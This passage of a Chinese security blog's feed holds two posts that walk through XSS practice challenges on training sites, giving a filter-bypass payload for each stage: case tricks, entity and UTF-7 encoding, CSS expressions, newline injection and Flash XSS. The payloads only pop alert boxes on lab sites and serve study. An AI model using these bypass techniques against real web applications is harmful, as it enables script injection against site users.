href=javascript:alert(1)&gt;</code>通过点击出现的链接进行通关。</p><p><strong><em>Stage#6: <a href="http://sqler.win/xss/level6.php?keyword=break" target="_blank" rel="external">http://sqler.win/xss/level6.php?keyword=break</a> it out! </em></strong><br>随便哪一个试一下，处理掉了src、herf、onxxx、等，需要进行绕过，通过大小写，成功绕过payload：<code>&quot;&gt;&lt;a HRef=javascript:alert(1)&gt;</code></p><p><strong><em>Stage#7: <a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>本题对输入的script、on等进行了单层过滤，可以使用其过滤不严，采用此类payload绕过即可：<code>&lt;svg/oonnload=alert(1)&gt;、或者将script写成scrscriptipt</code>的方式构造即可。</p><p><strong><em>Stage#8:<a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>本题已经给出了一个<a>标签,但是过滤了script、src等，大小写无法绕过，但是可以使用html编码进行绕过payload：<code>javasc&amp;#114;ipt:alert(1)</code></a></p><p><strong><em>Stage#9：<a href="http://sqler.win/xss/level9.php?keyword=not" target="_blank" rel="external">http://sqler.win/xss/level9.php?keyword=not</a> bad! </em></strong><br>本题最大的难点在于绕合法连接，发现只有带<code>http://</code>的url才能被认为是合法链接，另外由于“”也被过滤，其他规则与上一关相同，因此需要进行编码。于是构造payload： <code>javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;)</code></p><p><strong><em>Stage#10：<a href="http://sqler.win/xss/level10.php?keyword=well" target="_blank" rel="external">http://sqler.win/xss/level10.php?keyword=well</a> done! </em></strong><br>本题存在三个隐藏输入框，构造如下get请求，查看元素后，发现t_sort能被写入，如图：<br>get请求：<a href="http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333" target="_blank" rel="external">http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333</a></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-14.png" alt="图14"></p><p>因此只需要在该参数处构造跨站脚本语句即可，使用<code>&quot;onmouseover=&#39;alert(1)&#39;</code>然后让输入框属性显示出来改hidden为text即可：payload如下：<br><code>http://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#11：<a href="http://sqler.win/xss/level11.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level11.php?keyword=good</a> job! </em></strong><br>通过查看元素，发现t_ref的value是我们这个网页的referer值，抓包修改referer输入xss payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code>即可，本题不想多说什么，感觉referer一般存在xss的极少。</p><p><strong><em>Stage#12：<a href="http://sqler.win/xss/level12.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level12.php?keyword=good</a> job! </em></strong><br>查看元素可看到t_ua参数的value是User-Agent值，和上一题一样，修改为xss payload即可：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#13：<a href="http://sqler.win/xss/level13.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level13.php?keyword=good</a> job! </em></strong><br>此题思路同上，这次传参位置为cookie，payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;；</code>感觉这三题是绕脑洞的样子，，，但是在测试过程中还真没发现过，，，，</p><p><strong><em>Stage#14：<a href="http://sqler.win/xss/level14.php" target="_blank" rel="external">http://sqler.win/xss/level14.php</a></em></strong><br>本题可以在查看元素发现嵌入了一个iframe页面，访问该页面是查看图片EXIF信息的，通过看答案知道有EXIF在解析过程中，某些插件在解析时输出未处理可导致xss漏洞，因此食用exiftool工具，修改图片EXIF后，进行上传，然后解析过程中弹窗。学习了，，，， </p><p><strong><em>Stage#15：<a href="http://sqler.win/xsschallenge/level15.php?src=1.jpg" target="_blank" rel="external">http://sqler.win/xsschallenge/level15.php?src=1.jpg</a></em></strong><br>本关说是利用src可包含前面页面上的xss漏洞，然后进行弹窗，怎么尝试都没弹出来，，，表示无奈。。。。。</p><p><strong><em>Stage#16：<a href="http://sqler.win/xss/level16.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level16.php?keyword=</a></em></strong><br>本题终于回到常规绕的思路上了，，经过尝试，可以判断过滤了空格，/等符号，然后尝试绕过，很多姿势都不行，包括编码，进制，截断等然后发现换行符可以绕过：%0a、%0d，因此，payload：<br><code>http://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt;</code></p><p><strong><em>Stage#17：<a href="http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b</a></em></strong><br>本题比较简单，在arg02参数值中写入事件型payload即可触发，payload:<br><code>http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1)</code></p><p><strong><em>Stage#18：ttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=b</em></strong><br>本题与上一题相似，但是arg02无法构造出空格，也就没办法写入输出语句，然后试了试arg01，果然换汤不换药，直接写入payload：<code>%20onmousedown=alert(1)</code></p><p><strong><em>Stage#19：<a href="http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b" target="_blank" rel="external">http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b</a></em></strong><br>右键查看元素可以看到一个swf文件被调用，然后设想为flash xss，通过下载该文件，使用JPEXS进行分析，发现为actionscript 2.0，然后知道actionscript 2.0是有可以使用getURL来执行javascript下面以一个实例来剖析Flash XSS过程。有点拗口，，,然后对应本题，定位geturl函数：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-15.png" alt="图15"><br>可以看到在sIFR的内容中当getURL打开时，version是可以传入到loc4中的，因此定位contentIsLink函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">function contentIsLink()</div><div class="line">  &#123;</div><div class="line">     return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p><p>然后可以根据contentIsLink函数构造出payload:<br><code>http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E</code></p><p><strong><em>Stage#20：<a href="http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b</a></em></strong><br>本题个人感觉比上一题容易做出来，，下载swf文件使用JPEXS进行分析后可以发现是zeroclipboard.swf，然后百度一发，<a href="http://www.freebuf.com/sectool/108568.html" target="_blank" rel="external">freebuf</a>第一个，粘贴即可payload：<br><code>http://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-16.png" alt="图16"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接着上一文过来，这一部分是第二个环境的做题记录。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>我与XSS的感情之路(1)</title>
    <link href="http://sunu11.com/2017/07/20/12/"/>
    <id>http://sunu11.com/2017/07/20/12/</id>
    <published>2017-07-20T01:43:55.000Z</published>
    <updated>2018-11-03T11:56:39.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。<a id="more"></a><br>攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。本文主要是通过几个在线练习平台，记录一下个人对于xss漏洞的一些思路和总结。</p><h2 id="平台1-xss-quiz"><a href="#平台1-xss-quiz" class="headerlink" title="平台1 xss-quiz"></a>平台1 <a href="http://xss-quiz.int21h.jp" target="_blank" rel="external">xss-quiz</a></h2><p><strong><em>Stage#1: <a href="http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9</a></em></strong></p><p>使用正常xss payload弹出domain即可通过。payload如：<br><code>&lt;img onerrer=&quot;alert(document.domain);&quot;src=&gt; &lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-1.png" alt="图1"></p><p><strong><em>Stage#2: <a href="http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d</a></em></strong><br>这一题关键在于语句需要闭合，当闭合语句后，均可触发。payload如：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;  &quot;onclick=alert(document.domain) value=&quot;asd</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-2.png" alt="图2"></p><p><strong><em>Stage#3: <a href="http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7</a></em></strong><br>该题在写入js语句后，对尖括号进行了转义</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-3.png" alt="图3"></p><p>尝试绕过，没有实现，但是可以在p2参数的参数值处构造跨站语句，成功弹出domain</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-4.png" alt="图4"></p><p><strong><em>Stage#4: <a href="http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0</a></em></strong><br>p1、p2均作过滤了，在p3处闭合语句即可弹出，可通过查看源码发现隐藏的输入框，修改hackme的那个type为text，即p3的输入点即可，payload：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p><p><strong><em>Stage#5: <a href="http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e</a></em></strong><br>长度限制，使用burp改包绕过即可。也可以更改如图所示长度进行绕过，payload：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-5.png" alt="图5"></p><p><strong><em>Stage#6: <a href="http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725</a></em></strong><br>该题过滤了尖括号&lt;&gt;，<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-6.png" alt="图6"><br>尝试绕过，发现可用鼠标移动类进行绕过如：<br><code>&quot;onmouseover=&quot;alert(document.domain);&quot; &quot;onmouseout=&quot;alert(document.domain);&quot; &quot;onclick=alert(document.domain)等</code></p><p><strong><em>Stage#7: <a href="http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8</a></em></strong><br>通过测试，发现该题过滤了&lt;&gt;、”、&amp;等，而且输入空格后自动添加双引号，因此，可构造此类payload如: <code>a onmouseover=alert(document.domain)</code>实现弹窗。</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-7.png" alt="图7"></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-8.png" alt="图8"></p><p><strong><em>Stage#8: <a href="http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa</a></em></strong><br>此题采用javascript伪协议即可，比较简单。Payload：<code>javascript:alert(document.domain);</code></p><p><em>*</em>Stage#9: <a href="http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934</a><br>此题提示信息为UTF7,因此通过UTF-7转码即可，不用burp截包，需要更改charset类型为text，并更改其value为UTF-7,然后即可弹窗payload：<br><code>+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk-</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-9.png" alt="图9"></p><p><strong><em>Stage#10: <a href="http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38</a></em></strong><br>通过提示可看到domain被过滤了，可使用dodomainmain嵌套的方式进行绕过，因此，payload为：<code>&quot;onmouseover=&quot;alert(document.domdomainain);//</code></p><p><strong><em>Stage#11: <a href="http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9</a></em></strong><br>可以从提示中看到过滤规则如下：”s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”，因此可以通过进行编码的方式构造xss语句。注意闭合前后。即可弹窗，payload：<br><code>&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-10.png" alt="图10"></p><p><strong><em>Stage#12: <a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a</a></em></strong><br>此题过滤规则如下：”s/[\x00-\x20\&lt;>\”\’]//g;”，过滤很严，从x00-x20,&lt;&gt;,”’都被过滤，于是用什么闭合是此题的关键，在IE8下可以通过`进行闭合因此，可以构造payload：<br><code>`` onmouseover=alert(document.domain);</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-11.png" alt="图11"></p><p><strong><em>Stage#13: <a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7</a></em></strong><br>此题说是再CSS中用expression来实现js中的on事件，进而执行xss语句，再ie下可以利用，payload如下：xx:expression(onmouseover=function(){alert(document.domain)})</p><p><strong><em>Stage#14: <a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b</a></em></strong><br>此题与上一题相似，但是做了过滤：s/(url|script|eval|expression)/xxx/ig;过滤url，eval，script，expression因此，需要尝试绕过过滤，经过尝试，可以利用注释符<code>/**/、\、\0、编码</code>等方式绕过。Payload如：<br><code>xx:expre/**/ssion(onmouseover=function(){alert(document.domain)})</code></p><p><strong><em>Stage#15：<a href="http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726</a></em></strong><br>本题经过测试将&lt;&gt;进行了转义，并且过滤了\，无法使用事件类型构造语句实现弹窗。因此考虑绕过其过滤规则，经过测试，可以使用编码进行绕过将&lt;&gt;进行16进制编码或者unicode编码即可。Payload:<br><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code><br><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-12.png" alt="图12"></p><p><strong><em>Stage#16：<a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9</a></em></strong><br>此题与上一题相似，多一部分过滤：”s/\x/\\x/ig;”，因此无法使用16进制来绕过&lt;&gt;的过滤，用unicode编码同样可以绕过，也可以使用10进制绕过。<br>Payload: <code>\\74script\\76alert(document.domain);\\74/script\\76</code></p><p>Stage#17、Stage#18因为版本问题，过不去23333333。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;科普&quot;&gt;&lt;a href=&quot;#科普&quot; class=&quot;headerlink&quot; title=&quot;科普&quot;&gt;&lt;/a&gt;科普&lt;/h2&gt;&lt;p&gt;XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
</feed>
